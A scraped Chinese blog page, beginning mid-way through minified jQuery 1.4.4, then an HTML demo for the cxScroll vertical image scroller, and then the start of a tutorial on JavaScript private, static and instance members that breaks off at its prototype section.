1;o>=0;--o)c.nodeName(k[o],"tbody")&&!k[o].childNodes.length&&k[o].parentNode.removeChild(k[o])}!c.support.leadingWhitespace&&$.test(l)&&r.insertBefore(b.createTextNode($.exec(l)[0]),r.firstChild);l=r.childNodes}if(l.nodeType)f.push(l);else f=c.merge(f,l)}}if(d)for(h=0;f[h];h++)if(e&&c.nodeName(f[h],"script")&&(!f[h].type||f[h].type.toLowerCase()==="text/javascript"))e.push(f[h].parentNode?f[h].parentNode.removeChild(f[h]):f[h]);else{f[h].nodeType===1&&f.splice.apply(f,[h+1,0].concat(c.makeArray(f[h].getElementsByTagName("script"))));
d.appendChild(f[h])}return f},cleanData:function(a){for(var b,d,e=c.cache,f=c.event.special,h=c.support.deleteExpando,l=0,k;(k=a[l])!=null;l++)if(!(k.nodeName&&c.noData[k.nodeName.toLowerCase()]))if(d=k[c.expando]){if((b=e[d])&&b.events)for(var o in b.events)f[o]?c.event.remove(k,o):c.removeEvent(k,o,b.handle);if(h)delete k[c.expando];else k.removeAttribute&&k.removeAttribute(c.expando);delete e[d]}}});var Ea=/alpha\([^)]*\)/i,gb=/opacity=([^)]*)/,hb=/-([a-z])/ig,ib=/([A-Z])/g,Fa=/^-?\d+(?:px)?$/i,
jb=/^-?\d/,kb={position:"absolute",visibility:"hidden",display:"block"},Pa=["Left","Right"],Qa=["Top","Bottom"],W,Ga,aa,lb=function(a,b){return b.toUpperCase()};c.fn.css=function(a,b){if(arguments.length===2&&b===B)return this;return c.access(this,a,b,true,function(d,e,f){return f!==B?c.style(d,e,f):c.css(d,e)})};c.extend({cssHooks:{opacity:{get:function(a,b){if(b){var d=W(a,"opacity","opacity");return d===""?"1":d}else return a.style.opacity}}},cssNumber:{zIndex:true,fontWeight:true,opacity:true,
zoom:true,lineHeight:true},cssProps:{"float":c.support.cssFloat?"cssFloat":"styleFloat"},style:function(a,b,d,e){if(!(!a||a.nodeType===3||a.nodeType===8||!a.style)){var f,h=c.camelCase(b),l=a.style,k=c.cssHooks[h];b=c.cssProps[h]||h;if(d!==B){if(!(typeof d==="number"&&isNaN(d)||d==null)){if(typeof d==="number"&&!c.cssNumber[h])d+="px";if(!k||!("set"in k)||(d=k.set(a,d))!==B)try{l[b]=d}catch(o){}}}else{if(k&&"get"in k&&(f=k.get(a,false,e))!==B)return f;return l[b]}}},css:function(a,b,d){var e,f=c.camelCase(b),
h=c.cssHooks[f];b=c.cssProps[f]||f;if(h&&"get"in h&&(e=h.get(a,true,d))!==B)return e;else if(W)return W(a,b,f)},swap:function(a,b,d){var e={},f;for(f in b){e[f]=a.style[f];a.style[f]=b[f]}d.call(a);for(f in b)a.style[f]=e[f]},camelCase:function(a){return a.replace(hb,lb)}});c.curCSS=c.css;c.each(["height","width"],function(a,b){c.cssHooks[b]={get:function(d,e,f){var h;if(e){if(d.offsetWidth!==0)h=oa(d,b,f);else c.swap(d,kb,function(){h=oa(d,b,f)});if(h<=0){h=W(d,b,b);if(h==="0px"&&aa)h=aa(d,b,b);
if(h!=null)return h===""||h==="auto"?"0px":h}if(h<0||h==null){h=d.style[b];return h===""||h==="auto"?"0px":h}return typeof h==="string"?h:h+"px"}},set:function(d,e){if(Fa.test(e)){e=parseFloat(e);if(e>=0)return e+"px"}else return e}}});if(!c.support.opacity)c.cssHooks.opacity={get:function(a,b){return gb.test((b&&a.currentStyle?a.currentStyle.filter:a.style.filter)||"")?parseFloat(RegExp.$1)/100+"":b?"1":""},set:function(a,b){var d=a.style;d.zoom=1;var e=c.isNaN(b)?"":"alpha(opacity="+b*100+")",f=
d.filter||"";d.filter=Ea.test(f)?f.replace(Ea,e):d.filter+" "+e}};if(t.defaultView&&t.defaultView.getComputedStyle)Ga=function(a,b,d){var e;d=d.replace(ib,"-$1").toLowerCase();if(!(b=a.ownerDocument.defaultView))return B;if(b=b.getComputedStyle(a,null)){e=b.getPropertyValue(d);if(e===""&&!c.contains(a.ownerDocument.documentElement,a))e=c.style(a,d)}return e};if(t.documentElement.currentStyle)aa=function(a,b){var d,e,f=a.currentStyle&&a.currentStyle[b],h=a.style;if(!Fa.test(f)&&jb.test(f)){d=h.left;
e=a.runtimeStyle.left;a.runtimeStyle.left=a.currentStyle.left;h.left=b==="fontSize"?"1em":f||0;f=h.pixelLeft+"px";h.left=d;a.runtimeStyle.left=e}return f===""?"auto":f};W=Ga||aa;if(c.expr&&c.expr.filters){c.expr.filters.hidden=function(a){var b=a.offsetHeight;return a.offsetWidth===0&&b===0||!c.support.reliableHiddenOffsets&&(a.style.display||c.css(a,"display"))==="none"};c.expr.filters.visible=function(a){return!c.expr.filters.hidden(a)}}var mb=c.now(),nb=/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,
ob=/^(?:select|textarea)/i,pb=/^(?:color|date|datetime|email|hidden|month|number|password|range|search|tel|text|time|url|week)$/i,qb=/^(?:GET|HEAD)$/,Ra=/\[\]$/,T=/\=\?(&|$)/,ja=/\?/,rb=/([?&])_=[^&]*/,sb=/^(\w+:)?\/\/([^\/?#]+)/,tb=/%20/g,ub=/#.*$/,Ha=c.fn.load;c.fn.extend({load:function(a,b,d){if(typeof a!=="string"&&Ha)return Ha.apply(this,arguments);else if(!this.length)return this;var e=a.indexOf(" ");if(e>=0){var f=a.slice(e,a.length);a=a.slice(0,e)}e="GET";if(b)if(c.isFunction(b)){d=b;b=null}else if(typeof b===
"object"){b=c.param(b,c.ajaxSettings.traditional);e="POST"}var h=this;c.ajax({url:a,type:e,dataType:"html",data:b,complete:function(l,k){if(k==="success"||k==="notmodified")h.html(f?c("<div>").append(l.responseText.replace(nb,"")).find(f):l.responseText);d&&h.each(d,[l.responseText,k,l])}});return this},serialize:function(){return c.param(this.serializeArray())},serializeArray:function(){return this.map(function(){return this.elements?c.makeArray(this.elements):this}).filter(function(){return this.name&&
!this.disabled&&(this.checked||ob.test(this.nodeName)||pb.test(this.type))}).map(function(a,b){var d=c(this).val();return d==null?null:c.isArray(d)?c.map(d,function(e){return{name:b.name,value:e}}):{name:b.name,value:d}}).get()}});c.each("ajaxStart ajaxStop ajaxComplete ajaxError ajaxSuccess ajaxSend".split(" "),function(a,b){c.fn[b]=function(d){return this.bind(b,d)}});c.extend({get:function(a,b,d,e){if(c.isFunction(b)){e=e||d;d=b;b=null}return c.ajax({type:"GET",url:a,data:b,success:d,dataType:e})},
getScript:function(a,b){return c.get(a,null,b,"script")},getJSON:function(a,b,d){return c.get(a,b,d,"json")},post:function(a,b,d,e){if(c.isFunction(b)){e=e||d;d=b;b={}}return c.ajax({type:"POST",url:a,data:b,success:d,dataType:e})},ajaxSetup:function(a){c.extend(c.ajaxSettings,a)},ajaxSettings:{url:location.href,global:true,type:"GET",contentType:"application/x-www-form-urlencoded",processData:true,async:true,xhr:function(){return new E.XMLHttpRequest},accepts:{xml:"application/xml, text/xml",html:"text/html",
script:"text/javascript, application/javascript",json:"application/json, text/javascript",text:"text/plain",_default:"*/*"}},ajax:function(a){var b=c.extend(true,{},c.ajaxSettings,a),d,e,f,h=b.type.toUpperCase(),l=qb.test(h);b.url=b.url.replace(ub,"");b.context=a&&a.context!=null?a.context:b;if(b.data&&b.processData&&typeof b.data!=="string")b.data=c.param(b.data,b.traditional);if(b.dataType==="jsonp"){if(h==="GET")T.test(b.url)||(b.url+=(ja.test(b.url)?"&":"?")+(b.jsonp||"callback")+"=?");else if(!b.data||
!T.test(b.data))b.data=(b.data?b.data+"&":"")+(b.jsonp||"callback")+"=?";b.dataType="json"}if(b.dataType==="json"&&(b.data&&T.test(b.data)||T.test(b.url))){d=b.jsonpCallback||"jsonp"+mb++;if(b.data)b.data=(b.data+"").replace(T,"="+d+"$1");b.url=b.url.replace(T,"="+d+"$1");b.dataType="script";var k=E[d];E[d]=function(m){if(c.isFunction(k))k(m);else{E[d]=B;try{delete E[d]}catch(p){}}f=m;c.handleSuccess(b,w,e,f);c.handleComplete(b,w,e,f);r&&r.removeChild(A)}}if(b.dataType==="script"&&b.cache===null)b.cache=
false;if(b.cache===false&&l){var o=c.now(),x=b.url.replace(rb,"$1_="+o);b.url=x+(x===b.url?(ja.test(b.url)?"&":"?")+"_="+o:"")}if(b.data&&l)b.url+=(ja.test(b.url)?"&":"?")+b.data;b.global&&c.active++===0&&c.event.trigger("ajaxStart");o=(o=sb.exec(b.url))&&(o[1]&&o[1].toLowerCase()!==location.protocol||o[2].toLowerCase()!==location.host);if(b.dataType==="script"&&h==="GET"&&o){var r=t.getElementsByTagName("head")[0]||t.documentElement,A=t.createElement("script");if(b.scriptCharset)A.charset=b.scriptCharset;
A.src=b.url;if(!d){var C=false;A.onload=A.onreadystatechange=function(){if(!C&&(!this.readyState||this.readyState==="loaded"||this.readyState==="complete")){C=true;c.handleSuccess(b,w,e,f);c.handleComplete(b,w,e,f);A.onload=A.onreadystatechange=null;r&&A.parentNode&&r.removeChild(A)}}}r.insertBefore(A,r.firstChild);return B}var J=false,w=b.xhr();if(w){b.username?w.open(h,b.url,b.async,b.username,b.password):w.open(h,b.url,b.async);try{if(b.data!=null&&!l||a&&a.contentType)w.setRequestHeader("Content-Type",
b.contentType);if(b.ifModified){c.lastModified[b.url]&&w.setRequestHeader("If-Modified-Since",c.lastModified[b.url]);c.etag[b.url]&&w.setRequestHeader("If-None-Match",c.etag[b.url])}o||w.setRequestHeader("X-Requested-With","XMLHttpRequest");w.setRequestHeader("Accept",b.dataType&&b.accepts[b.dataType]?b.accepts[b.dataType]+", */*; q=0.01":b.accepts._default)}catch(I){}if(b.beforeSend&&b.beforeSend.call(b.context,w,b)===false){b.global&&c.active--===1&&c.event.trigger("ajaxStop");w.abort();return false}b.global&&
c.triggerGlobal(b,"ajaxSend",[w,b]);var L=w.onreadystatechange=function(m){if(!w||w.readyState===0||m==="abort"){J||c.handleComplete(b,w,e,f);J=true;if(w)w.onreadystatechange=c.noop}else if(!J&&w&&(w.readyState===4||m==="timeout")){J=true;w.onreadystatechange=c.noop;e=m==="timeout"?"timeout":!c.httpSuccess(w)?"error":b.ifModified&&c.httpNotModified(w,b.url)?"notmodified":"success";var p;if(e==="success")try{f=c.httpData(w,b.dataType,b)}catch(q){e="parsererror";p=q}if(e==="success"||e==="notmodified")d||
c.handleSuccess(b,w,e,f);else c.handleError(b,w,e,p);d||c.handleComplete(b,w,e,f);m==="timeout"&&w.abort();if(b.async)w=null}};try{var g=w.abort;w.abort=function(){w&&Function.prototype.call.call(g,w);L("abort")}}catch(i){}b.async&&b.timeout>0&&setTimeout(function(){w&&!J&&L("timeout")},b.timeout);try{w.send(l||b.data==null?null:b.data)}catch(n){c.handleError(b,w,null,n);c.handleComplete(b,w,e,f)}b.async||L();return w}},param:function(a,b){var d=[],e=function(h,l){l=c.isFunction(l)?l():l;d[d.length]=
encodeURIComponent(h)+"="+encodeURIComponent(l)};if(b===B)b=c.ajaxSettings.traditional;if(c.isArray(a)||a.jquery)c.each(a,function(){e(this.name,this.value)});else for(var f in a)da(f,a[f],b,e);return d.join("&").replace(tb,"+")}});c.extend({active:0,lastModified:{},etag:{},handleError:function(a,b,d,e){a.error&&a.error.call(a.context,b,d,e);a.global&&c.triggerGlobal(a,"ajaxError",[b,a,e])},handleSuccess:function(a,b,d,e){a.success&&a.success.call(a.context,e,d,b);a.global&&c.triggerGlobal(a,"ajaxSuccess",
[b,a])},handleComplete:function(a,b,d){a.complete&&a.complete.call(a.context,b,d);a.global&&c.triggerGlobal(a,"ajaxComplete",[b,a]);a.global&&c.active--===1&&c.event.trigger("ajaxStop")},triggerGlobal:function(a,b,d){(a.context&&a.context.url==null?c(a.context):c.event).trigger(b,d)},httpSuccess:function(a){try{return!a.status&&location.protocol==="file:"||a.status>=200&&a.status<300||a.status===304||a.status===1223}catch(b){}return false},httpNotModified:function(a,b){var d=a.getResponseHeader("Last-Modified"),
e=a.getResponseHeader("Etag");if(d)c.lastModified[b]=d;if(e)c.etag[b]=e;return a.status===304},httpData:function(a,b,d){var e=a.getResponseHeader("content-type")||"",f=b==="xml"||!b&&e.indexOf("xml")>=0;a=f?a.responseXML:a.responseText;f&&a.documentElement.nodeName==="parsererror"&&c.error("parsererror");if(d&&d.dataFilter)a=d.dataFilter(a,b);if(typeof a==="string")if(b==="json"||!b&&e.indexOf("json")>=0)a=c.parseJSON(a);else if(b==="script"||!b&&e.indexOf("javascript")>=0)c.globalEval(a);return a}});
if(E.ActiveXObject)c.ajaxSettings.xhr=function(){if(E.location.protocol!=="file:")try{return new E.XMLHttpRequest}catch(a){}try{return new E.ActiveXObject("Microsoft.XMLHTTP")}catch(b){}};c.support.ajax=!!c.ajaxSettings.xhr();var ea={},vb=/^(?:toggle|show|hide)$/,wb=/^([+\-]=)?([\d+.\-]+)(.*)$/,ba,pa=[["height","marginTop","marginBottom","paddingTop","paddingBottom"],["width","marginLeft","marginRight","paddingLeft","paddingRight"],["opacity"]];c.fn.extend({show:function(a,b,d){if(a||a===0)return this.animate(S("show",
3),a,b,d);else{d=0;for(var e=this.length;d<e;d++){a=this[d];b=a.style.display;if(!c.data(a,"olddisplay")&&b==="none")b=a.style.display="";b===""&&c.css(a,"display")==="none"&&c.data(a,"olddisplay",qa(a.nodeName))}for(d=0;d<e;d++){a=this[d];b=a.style.display;if(b===""||b==="none")a.style.display=c.data(a,"olddisplay")||""}return this}},hide:function(a,b,d){if(a||a===0)return this.animate(S("hide",3),a,b,d);else{a=0;for(b=this.length;a<b;a++){d=c.css(this[a],"display");d!=="none"&&c.data(this[a],"olddisplay",
d)}for(a=0;a<b;a++)this[a].style.display="none";return this}},_toggle:c.fn.toggle,toggle:function(a,b,d){var e=typeof a==="boolean";if(c.isFunction(a)&&c.isFunction(b))this._toggle.apply(this,arguments);else a==null||e?this.each(function(){var f=e?a:c(this).is(":hidden");c(this)[f?"show":"hide"]()}):this.animate(S("toggle",3),a,b,d);return this},fadeTo:function(a,b,d,e){return this.filter(":hidden").css("opacity",0).show().end().animate({opacity:b},a,d,e)},animate:function(a,b,d,e){var f=c.speed(b,
d,e);if(c.isEmptyObject(a))return this.each(f.complete);return this[f.queue===false?"each":"queue"](function(){var h=c.extend({},f),l,k=this.nodeType===1,o=k&&c(this).is(":hidden"),x=this;for(l in a){var r=c.camelCase(l);if(l!==r){a[r]=a[l];delete a[l];l=r}if(a[l]==="hide"&&o||a[l]==="show"&&!o)return h.complete.call(this);if(k&&(l==="height"||l==="width")){h.overflow=[this.style.overflow,this.style.overflowX,this.style.overflowY];if(c.css(this,"display")==="inline"&&c.css(this,"float")==="none")if(c.support.inlineBlockNeedsLayout)if(qa(this.nodeName)===
"inline")this.style.display="inline-block";else{this.style.display="inline";this.style.zoom=1}else this.style.display="inline-block"}if(c.isArray(a[l])){(h.specialEasing=h.specialEasing||{})[l]=a[l][1];a[l]=a[l][0]}}if(h.overflow!=null)this.style.overflow="hidden";h.curAnim=c.extend({},a);c.each(a,function(A,C){var J=new c.fx(x,h,A);if(vb.test(C))J[C==="toggle"?o?"show":"hide":C](a);else{var w=wb.exec(C),I=J.cur()||0;if(w){var L=parseFloat(w[2]),g=w[3]||"px";if(g!=="px"){c.style(x,A,(L||1)+g);I=(L||
1)/J.cur()*I;c.style(x,A,I+g)}if(w[1])L=(w[1]==="-="?-1:1)*L+I;J.custom(I,L,g)}else J.custom(I,C,"")}});return true})},stop:function(a,b){var d=c.timers;a&&this.queue([]);this.each(function(){for(var e=d.length-1;e>=0;e--)if(d[e].elem===this){b&&d[e](true);d.splice(e,1)}});b||this.dequeue();return this}});c.each({slideDown:S("show",1),slideUp:S("hide",1),slideToggle:S("toggle",1),fadeIn:{opacity:"show"},fadeOut:{opacity:"hide"},fadeToggle:{opacity:"toggle"}},function(a,b){c.fn[a]=function(d,e,f){return this.animate(b,
d,e,f)}});c.extend({speed:function(a,b,d){var e=a&&typeof a==="object"?c.extend({},a):{complete:d||!d&&b||c.isFunction(a)&&a,duration:a,easing:d&&b||b&&!c.isFunction(b)&&b};e.duration=c.fx.off?0:typeof e.duration==="number"?e.duration:e.duration in c.fx.speeds?c.fx.speeds[e.duration]:c.fx.speeds._default;e.old=e.complete;e.complete=function(){e.queue!==false&&c(this).dequeue();c.isFunction(e.old)&&e.old.call(this)};return e},easing:{linear:function(a,b,d,e){return d+e*a},swing:function(a,b,d,e){return(-Math.cos(a*
Math.PI)/2+0.5)*e+d}},timers:[],fx:function(a,b,d){this.options=b;this.elem=a;this.prop=d;if(!b.orig)b.orig={}}});c.fx.prototype={update:function(){this.options.step&&this.options.step.call(this.elem,this.now,this);(c.fx.step[this.prop]||c.fx.step._default)(this)},cur:function(){if(this.elem[this.prop]!=null&&(!this.elem.style||this.elem.style[this.prop]==null))return this.elem[this.prop];var a=parseFloat(c.css(this.elem,this.prop));return a&&a>-1E4?a:0},custom:function(a,b,d){function e(l){return f.step(l)}
var f=this,h=c.fx;this.startTime=c.now();this.start=a;this.end=b;this.unit=d||this.unit||"px";this.now=this.start;this.pos=this.state=0;e.elem=this.elem;if(e()&&c.timers.push(e)&&!ba)ba=setInterval(h.tick,h.interval)},show:function(){this.options.orig[this.prop]=c.style(this.elem,this.prop);this.options.show=true;this.custom(this.prop==="width"||this.prop==="height"?1:0,this.cur());c(this.elem).show()},hide:function(){this.options.orig[this.prop]=c.style(this.elem,this.prop);this.options.hide=true;
this.custom(this.cur(),0)},step:function(a){var b=c.now(),d=true;if(a||b>=this.options.duration+this.startTime){this.now=this.end;this.pos=this.state=1;this.update();this.options.curAnim[this.prop]=true;for(var e in this.options.curAnim)if(this.options.curAnim[e]!==true)d=false;if(d){if(this.options.overflow!=null&&!c.support.shrinkWrapBlocks){var f=this.elem,h=this.options;c.each(["","X","Y"],function(k,o){f.style["overflow"+o]=h.overflow[k]})}this.options.hide&&c(this.elem).hide();if(this.options.hide||
this.options.show)for(var l in this.options.curAnim)c.style(this.elem,l,this.options.orig[l]);this.options.complete.call(this.elem)}return false}else{a=b-this.startTime;this.state=a/this.options.duration;b=this.options.easing||(c.easing.swing?"swing":"linear");this.pos=c.easing[this.options.specialEasing&&this.options.specialEasing[this.prop]||b](this.state,a,0,1,this.options.duration);this.now=this.start+(this.end-this.start)*this.pos;this.update()}return true}};c.extend(c.fx,{tick:function(){for(var a=
c.timers,b=0;b<a.length;b++)a[b]()||a.splice(b--,1);a.length||c.fx.stop()},interval:13,stop:function(){clearInterval(ba);ba=null},speeds:{slow:600,fast:200,_default:400},step:{opacity:function(a){c.style(a.elem,"opacity",a.now)},_default:function(a){if(a.elem.style&&a.elem.style[a.prop]!=null)a.elem.style[a.prop]=(a.prop==="width"||a.prop==="height"?Math.max(0,a.now):a.now)+a.unit;else a.elem[a.prop]=a.now}}});if(c.expr&&c.expr.filters)c.expr.filters.animated=function(a){return c.grep(c.timers,function(b){return a===
b.elem}).length};var xb=/^t(?:able|d|h)$/i,Ia=/^(?:body|html)$/i;c.fn.offset="getBoundingClientRect"in t.documentElement?function(a){var b=this[0],d;if(a)return this.each(function(l){c.offset.setOffset(this,a,l)});if(!b||!b.ownerDocument)return null;if(b===b.ownerDocument.body)return c.offset.bodyOffset(b);try{d=b.getBoundingClientRect()}catch(e){}var f=b.ownerDocument,h=f.documentElement;if(!d||!c.contains(h,b))return d||{top:0,left:0};b=f.body;f=fa(f);return{top:d.top+(f.pageYOffset||c.support.boxModel&&
h.scrollTop||b.scrollTop)-(h.clientTop||b.clientTop||0),left:d.left+(f.pageXOffset||c.support.boxModel&&h.scrollLeft||b.scrollLeft)-(h.clientLeft||b.clientLeft||0)}}:function(a){var b=this[0];if(a)return this.each(function(x){c.offset.setOffset(this,a,x)});if(!b||!b.ownerDocument)return null;if(b===b.ownerDocument.body)return c.offset.bodyOffset(b);c.offset.initialize();var d,e=b.offsetParent,f=b.ownerDocument,h=f.documentElement,l=f.body;d=(f=f.defaultView)?f.getComputedStyle(b,null):b.currentStyle;
for(var k=b.offsetTop,o=b.offsetLeft;(b=b.parentNode)&&b!==l&&b!==h;){if(c.offset.supportsFixedPosition&&d.position==="fixed")break;d=f?f.getComputedStyle(b,null):b.currentStyle;k-=b.scrollTop;o-=b.scrollLeft;if(b===e){k+=b.offsetTop;o+=b.offsetLeft;if(c.offset.doesNotAddBorder&&!(c.offset.doesAddBorderForTableAndCells&&xb.test(b.nodeName))){k+=parseFloat(d.borderTopWidth)||0;o+=parseFloat(d.borderLeftWidth)||0}e=b.offsetParent}if(c.offset.subtractsBorderForOverflowNotVisible&&d.overflow!=="visible"){k+=
parseFloat(d.borderTopWidth)||0;o+=parseFloat(d.borderLeftWidth)||0}d=d}if(d.position==="relative"||d.position==="static"){k+=l.offsetTop;o+=l.offsetLeft}if(c.offset.supportsFixedPosition&&d.position==="fixed"){k+=Math.max(h.scrollTop,l.scrollTop);o+=Math.max(h.scrollLeft,l.scrollLeft)}return{top:k,left:o}};c.offset={initialize:function(){var a=t.body,b=t.createElement("div"),d,e,f,h=parseFloat(c.css(a,"marginTop"))||0;c.extend(b.style,{position:"absolute",top:0,left:0,margin:0,border:0,width:"1px",
height:"1px",visibility:"hidden"});b.innerHTML="<div style='position:absolute;top:0;left:0;margin:0;border:5px solid #000;padding:0;width:1px;height:1px;'><div></div></div><table style='position:absolute;top:0;left:0;margin:0;border:5px solid #000;padding:0;width:1px;height:1px;' cellpadding='0' cellspacing='0'><tr><td></td></tr></table>";a.insertBefore(b,a.firstChild);d=b.firstChild;e=d.firstChild;f=d.nextSibling.firstChild.firstChild;this.doesNotAddBorder=e.offsetTop!==5;this.doesAddBorderForTableAndCells=
f.offsetTop===5;e.style.position="fixed";e.style.top="20px";this.supportsFixedPosition=e.offsetTop===20||e.offsetTop===15;e.style.position=e.style.top="";d.style.overflow="hidden";d.style.position="relative";this.subtractsBorderForOverflowNotVisible=e.offsetTop===-5;this.doesNotIncludeMarginInBodyOffset=a.offsetTop!==h;a.removeChild(b);c.offset.initialize=c.noop},bodyOffset:function(a){var b=a.offsetTop,d=a.offsetLeft;c.offset.initialize();if(c.offset.doesNotIncludeMarginInBodyOffset){b+=parseFloat(c.css(a,
"marginTop"))||0;d+=parseFloat(c.css(a,"marginLeft"))||0}return{top:b,left:d}},setOffset:function(a,b,d){var e=c.css(a,"position");if(e==="static")a.style.position="relative";var f=c(a),h=f.offset(),l=c.css(a,"top"),k=c.css(a,"left"),o=e==="absolute"&&c.inArray("auto",[l,k])>-1;e={};var x={};if(o)x=f.position();l=o?x.top:parseInt(l,10)||0;k=o?x.left:parseInt(k,10)||0;if(c.isFunction(b))b=b.call(a,d,h);if(b.top!=null)e.top=b.top-h.top+l;if(b.left!=null)e.left=b.left-h.left+k;"using"in b?b.using.call(a,
e):f.css(e)}};c.fn.extend({position:function(){if(!this[0])return null;var a=this[0],b=this.offsetParent(),d=this.offset(),e=Ia.test(b[0].nodeName)?{top:0,left:0}:b.offset();d.top-=parseFloat(c.css(a,"marginTop"))||0;d.left-=parseFloat(c.css(a,"marginLeft"))||0;e.top+=parseFloat(c.css(b[0],"borderTopWidth"))||0;e.left+=parseFloat(c.css(b[0],"borderLeftWidth"))||0;return{top:d.top-e.top,left:d.left-e.left}},offsetParent:function(){return this.map(function(){for(var a=this.offsetParent||t.body;a&&!Ia.test(a.nodeName)&&
c.css(a,"position")==="static";)a=a.offsetParent;return a})}});c.each(["Left","Top"],function(a,b){var d="scroll"+b;c.fn[d]=function(e){var f=this[0],h;if(!f)return null;if(e!==B)return this.each(function(){if(h=fa(this))h.scrollTo(!a?e:c(h).scrollLeft(),a?e:c(h).scrollTop());else this[d]=e});else return(h=fa(f))?"pageXOffset"in h?h[a?"pageYOffset":"pageXOffset"]:c.support.boxModel&&h.document.documentElement[d]||h.document.body[d]:f[d]}});c.each(["Height","Width"],function(a,b){var d=b.toLowerCase();
c.fn["inner"+b]=function(){return this[0]?parseFloat(c.css(this[0],d,"padding")):null};c.fn["outer"+b]=function(e){return this[0]?parseFloat(c.css(this[0],d,e?"margin":"border")):null};c.fn[d]=function(e){var f=this[0];if(!f)return e==null?null:this;if(c.isFunction(e))return this.each(function(l){var k=c(this);k[d](e.call(this,l,k[d]()))});if(c.isWindow(f))return f.document.compatMode==="CSS1Compat"&&f.document.documentElement["client"+b]||f.document.body["client"+b];else if(f.nodeType===9)return Math.max(f.documentElement["client"+
b],f.body["scroll"+b],f.documentElement["scroll"+b],f.body["offset"+b],f.documentElement["offset"+b]);else if(e===B){f=c.css(f,d);var h=parseFloat(f);return c.isNaN(h)?f:h}else return this.css(d,typeof e==="string"?e:e+"px")}})})(window);

4、index.html


<!DOCTYPE HTML>
<html>
<head>
<meta charset="utf-8">
<title>cxScroll 间歇式无缝滚动</title>
<style>
body,h1,h2,h3,ul,li,p{margin:0;padding:0;}
body{font:14px/1.7 Arial,"\5b8b\4f53";}
h1,h2,h3{font:bold 36px/2 "\5fae\8f6f\96c5\9ed1";}
h1{padding:0 20px;background:#333;color:#fff;}
h2{font-size:20px;}
h3{font-size:16px;}
ul{list-style-type:none;}
.wrap{padding:0 20px; margin:0 auto; }

/* 纵向滚动
------------------------------ */
 .scroll_vertical{position:relative;width:1020px;height:110px; margin:0 auto;}
.scroll_vertical .box{overflow:hidden;position:relative;top:10px;height:110px;}
.scroll_vertical .list{position:absolute;top:0;left:0;}
.scroll_vertical .list li{height:110px;text-align:center; padding-right:10px;}
.scroll_vertical .prev,
.scroll_vertical .next{position:absolute;left:50%;width:120px;height:30px;margin-left:-25px;width:50px;height:40px;background-repeat:no-repeat;font:0/0 Arial;cursor:pointer;}
.scroll_vertical .prev{top:5px;background-position:-80px 0;}
.scroll_vertical .next{bottom:5px;background-position:-130px 0;}
.scroll_vertical .prev:hover{background-position:-80px -40px;}
.scroll_vertical .next:hover{background-position:-130px -40px;}
.scroll_vertical .list li a.jianju{padding-right:10px;}

</style>
</head>
<body>
<div class="wrap">
	<div id="pic_list" class="scroll_vertical">
		<div class="box">
			<ul class="list">
				<li><a class="jianju" href="#"><img src="img/temp_pic_1.jpg" width="330" height="110"></a><a class="jianju" href="#"><img src="img/temp_pic_2.jpg" width="330" height="110"></a><a href="#"><img src="img/temp_pic_3.jpg" width="330" height="110"></a></li>
				<li><a class="jianju" href="#"><img src="img/temp_pic_5.jpg" width="330" height="110"></a><a class="jianju" href="#"><img src="img/temp_pic_5.jpg" width="330" height="110"></a><a href="#"><img src="img/temp_pic_2.jpg" width="330" height="110"></a></li>
				<li><a class="jianju" href="#"><img src="img/temp_pic_3.jpg" width="330" height="110"><a class="jianju" href="#"><img src="img/temp_pic_5.jpg" width="330" height="110"></a><a href="#"><img src="img/temp_pic_5.jpg" width="330" height="110"></a></li>
			</ul>
		</div>
	</div>

<script src="js/jquery-1.4.4.min.js"></script>
<script src="js/jquery.cxscroll.min.js"></script>
<script>
$("#pic_list").cxScroll({direction:"bottom",speed:500,time:1500,plus:false,minus:false});
</script>
</body>
</html>
5、img图片




版权声明：本文为博主原创文章，未经博主允许不得转载。

JavaScript prototype详解

用过JavaScript的同学们肯定都对prototype如雷贯耳，但是这究竟是个什么东西却让初学者莫衷一是，只知道函数都会有一个prototype属性，可以为其添加函数供实例访问，其它的就不清楚了，最近看了一些 JavaScript高级程序设计，终于揭开了其神秘面纱。

每个函数都有一个prototype属性，这个属性是指向一个对象的引用，这个对象称为原型对象，原型对象包含函数实例共享的方法和属性，也就是说将函数用作构造函数调用（使用new操作符调用）的时候，新创建的对象会从原型对象上继承属性和方法。
私有变量、函数

在具体说prototype前说几个相关的东东，可以更好的理解prototype的设计意图。之前写的一篇JavaScript 命名空间博客提到过JavaScript的函数作用域，在函数内定义的变量和函数如果不对外提供接口，那么外部将无法访问到，也就是变为私有变量和私有函数。


function Obj(){
                var a=0; //私有变量
                var fn=function(){ //私有函数
                    
                }
            }



这样在函数对象Obj外部无法访问变量a和函数fn，它们就变成私有的，只能在Obj内部使用，即使是函数Obj的实例仍然无法访问这些变量和函数

var o=new Obj();
            console.log(o.a); //undefined
            console.log(o.fn); //undefined

静态变量、函数

当定义一个函数后通过 “.”为其添加的属性和函数，通过对象本身仍然可以访问得到，但是其实例却访问不到，这样的变量和函数分别被称为静态变量和静态函数，用过Java、C#的同学很好理解静态的含义。


function Obj(){
                
            }
            
            Obj.a=0; //静态变量
            
            Obj.fn=function(){ //静态函数
                    
            }
            
            console.log(Obj.a); //0
            console.log(typeof Obj.fn); //function
            
            var o=new Obj();
            console.log(o.a); //undefined
            console.log(typeof o.fn); //undefined


实例变量、函数

在面向对象编程中除了一些库函数我们还是希望在对象定义的时候同时定义一些属性和方法，实例化后可以访问，JavaScript也能做到这样


function Obj(){
                this.a=[]; //实例变量
                this.fn=function(){ //实例方法
                    
                }
            }
            
            console.log(typeof Obj.a); //undefined
            console.log(typeof Obj.fn); //undefined
            
            var o=new Obj();
            console.log(typeof o.a); //object
            console.log(typeof o.fn); //function



这样可以达到上述目的，然而


function Obj(){
                this.a=[]; //实例变量
                this.fn=function(){ //实例方法
                    
                }
            }
            
            var o1=new Obj();
            o1.a.push(1);
            o1.fn={};
            console.log(o1.a); //[1]
            console.log(typeof o1.fn); //object
            var o2=new Obj();
            console.log(o2.a); //[]
            console.log(typeof o2.fn); //function



上面的代码运行结果完全符合预期，但同时也说明一个问题，在o1中修改了a和fn，而在o2中没有改变，由于数组和函数都是对象，是引用类型，这就说明o1中的属性和方法与o2中的属性与方法虽然同名但却不是一个引用，而是对Obj对象定义的属性和方法的一个复制。

这个对属性来说没有什么问题，但是对于方法来说问题就很大了，因为方法都是在做完全一样的功能，但是却又两份复制，如果一个函数对象有上千和实例方法，那么它的每个实例都要保持一份上千个方法的复制，这显然是不科学的，这可肿么办呢，prototype应运而生。
prototype

